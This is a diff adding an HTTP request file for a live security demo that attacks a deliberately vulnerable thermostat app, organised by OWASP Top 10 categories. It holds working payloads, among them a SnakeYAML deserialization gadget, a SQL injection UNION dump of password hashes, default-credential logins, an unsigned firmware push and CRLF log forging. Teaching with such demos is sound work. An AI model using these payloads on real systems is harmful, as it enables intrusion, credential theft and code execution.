@@ -1,0 +1,97 @@
+# ThermoHub – live demo requests for IntelliJ's HTTP Client.
+# Pick the environment in the toolbar: "legacy" (port 8080) or "cra" (port 8081),
+# then run the SAME request against both products.
+# Demo passwords live in http-client.env.json (public, demo only).
+
+### A01 Broken Access Control – alice reads bob's thermostat (IDOR)
+GET {{host}}/api/devices/2
+Authorization: Basic alice {{alice}}
+
+### A02 Security Misconfiguration – configuration and secrets via the actuator, no login
+GET {{host}}/actuator/env
+
+### A03 Supply Chain Failures – SnakeYAML 1.33 gadget (CVE-2022-1471) creates a file on the server
+# Watch the project root in IntelliJ: PWNED-by-yaml.txt appears (legacy only).
+POST {{host}}/api/devices/1/config
+Authorization: Basic alice {{alice}}
+Content-Type: application/yaml
+
+ecoMode: true
+schedule: !!java.io.FileOutputStream ["PWNED-by-yaml.txt"]
+
+### A04 + A05 Injection – UNION payload dumps usernames and unsalted MD5 hashes
+# Payload: %' UNION SELECT 0, role, username, password_hash, 'pwned', 0 FROM users -- 
+# @no-auto-encoding
+GET {{host}}/api/devices/search?q={{sqli}}
+Authorization: Basic alice {{alice}}
+
+### A06 Insecure Design – a 95 °C setpoint is accepted
+PUT {{host}}/api/devices/1/setpoint
+Authorization: Basic alice {{alice}}
+Content-Type: application/json
+
+{"celsius": 95.0}
+
+### A06 Insecure Design – pairing guess (repeat 6x against "cra" to see HTTP 429)
+POST {{host}}/api/devices/pair
+Authorization: Basic bob {{bob}}
+Content-Type: application/json
+
+{"serial": "TH-0003", "code": "0000"}
+
+### A07 Authentication Failures – factory default admin/admin
+GET {{host}}/api/devices
+Authorization: Basic admin admin
+
+### A08 Integrity Failures – unsigned firmware rolled out to the whole fleet
+POST {{host}}/api/admin/firmware
+Authorization: Basic admin {{admin}}
+X-Firmware-Version: 6.6.6
+Content-Type: application/octet-stream
+
+THERMOHUB-FW 6.6.6 with a little extra
+
+### A08 (cra, optional) – signed firmware. See README "Signed firmware live demo".
+# Put firmwareSignature into http-client.private.env.json (git-ignored).
+POST {{host}}/api/admin/firmware
+Authorization: Basic admin {{admin}}
+X-Firmware-Version: 2.5.0
+X-Firmware-Signature: {{firmwareSignature}}
+Content-Type: application/octet-stream
+
+< ../fw-2.5.0.bin
+
+### A09 Logging & Alerting – forge a log line with CR/LF in the device name (watch the console)
+PUT {{host}}/api/devices/1/name
+Authorization: Basic alice {{alice}}
+Content-Type: application/json
+
+{"name": "Kitchen\n2026-12-03T09:00:00.000Z  INFO 4711 --- [nio-8080-exec-9] d.t.l.AdminController : role ADMIN granted to mallory"}
+
+### A09 – what did the security team see? (404 on legacy: nothing was recorded)
+GET {{host}}/api/admin/security-events
+Authorization: Basic admin {{admin}}
+
+### A10 Exceptional Conditions – fail-open: the lower-case command opens the debug shell
+POST {{host}}/api/devices/1/commands
+Authorization: Basic alice {{alice}}
+Content-Type: application/json
+
+{"command": "enable_debug_shell"}
+
+### A10 – the canonical form is blocked even on legacy (the bug lives in the error path)
+POST {{host}}/api/devices/1/commands
+Authorization: Basic alice {{alice}}
+Content-Type: application/json
+
+{"command": "ENABLE_DEBUG_SHELL"}
+
+### A10 – errors leak internals
+PUT {{host}}/api/devices/1/setpoint
+Authorization: Basic alice {{alice}}
+Content-Type: application/json
+
+{"celsius": "warm"}
+
+### CRA Annex I Part II (5),(6) – where do researchers report a vulnerability?
+GET {{host}}/.well-known/security.txt
